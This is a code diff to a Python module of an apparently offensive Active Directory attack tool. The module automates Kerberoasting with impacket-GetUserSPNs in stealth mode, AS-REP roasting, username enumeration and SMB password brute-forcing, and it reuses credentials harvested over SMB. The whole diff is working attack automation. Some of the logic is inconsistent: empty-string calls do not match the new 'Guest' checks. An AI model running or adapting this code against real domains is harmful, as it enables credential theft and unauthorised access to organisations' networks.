@@ -1,4 +1,5 @@
 from mods.mod_utils import *
+from mods.mod_smb import *
 import subprocess
 import os
 
@@ -70,7 +71,7 @@ def print_cracking_cmd():
 def check_kerberoast(target, domain, user='Guest', passw=''):
     cmd = f'impacket-GetUserSPNs {domain}/{user}:{passw} -dc-ip {target} -stealth'
 
-    if (user == ''):
+    if (user == 'Guest'):
         cmd = f'impacket-GetUserSPNs {domain}/jhon.doe -no-pass -dc-ip {target} -stealth'
 
     try:
@@ -127,6 +128,7 @@ def check_kerberoast(target, domain, user='Guest', passw=''):
 
 
 def check_smb_credentials(target, domain):
+    print('checking smb credentials file')
     # Check credentials founded on SMB first:
     if os.path.exists('smb_credentials.txt'):
         with open('smb_credentials.txt', 'r') as file:
@@ -137,7 +139,9 @@ def check_smb_credentials(target, domain):
                 cred = item
                 break
         user, passwd = cred.split(':')[:2]
+        print('check kerberoast with creds')
         check_kerberoast(target, domain, user, passwd)
+        print('check asreproast with creds')
         check_asreproast(target, domain, user, passwd)
         return True
     return False
@@ -145,7 +149,7 @@ def check_smb_credentials(target, domain):
 
 def check_asreproast(target, domain, user='Guest', passw=''):
     # NULL
-    if (user == ''):
+    if (user == 'Guest'):
         filename = 'smb_users.txt'
         if not (os.path.exists(filename)): return
 
@@ -159,34 +163,38 @@ def check_asreproast(target, domain, user='Guest', passw=''):
         printc(f'[-] {e}', RED)
 
     if output:
-        print(output)
+        """ printc('[+] ASREPRoastable accounts founded.', GREEN)
+        for line in output.splitlines():
+            if (domain.upper() in line):
+                printc(f'[+] {line}', BLUE) """
+
+
+def bruteforce_kerberos_users(target, domain):
+    # Try to bruteforce Usernames
+    users = enum_users(target, domain)
+
+    if (len(users) > 0):
+        # Try to bruteforce users credentials
+        export_wordlists(users, users)
+        bruteforce(target, '445')
+        if not check_smb_credentials(target, domain):
+            print('no smb users file')
+            # Check Kerberoast using guest creds
+            print('Check kerberoast Guest user')
+            check_kerberoast(target, domain, '')
+            print('Check asreproast Guest user')
+            check_asreproast(target, domain, '')
+
 
 
 def handle_kerberos(target, domain):
+    if (len(domain) < 3): return
+
     if not check_smb_credentials(target, domain):
         if os.path.exists('smb_users.txt'):
             with open('smb_users.txt', 'r') as file:
                 users = file.readlines()
-            if not ('lab' in users):
-                # Try to bruteforce Usernames
-                users = enum_users(target, domain)
-                
-                # Try to bruteforce users credentials
-                import mod_smb
-                mod_smb.smb_users = users
-                mod_smb.export_wordlists()
-                mod_smb.bruteforce(target, '445')
-
-                check_smb_credentials(target, domain)
-            else:
-                # Check Kerberoast using guest creds
-                check_kerberoast(target, domain)
-                check_kerberoast(target, domain, '')
-                check_asreproast(target, domain)
-                check_asreproast(target, domain, '')
+            if ('lab' in users):
+                bruteforce_kerberos_users(target, domain)
         else:
-            # Check Kerberoast using guest creds
-            check_kerberoast(target, domain)
-            check_kerberoast(target, domain, '')
-            check_asreproast(target, domain)
-            check_asreproast(target, domain, '')
+            bruteforce_kerberos_users(target, domain)
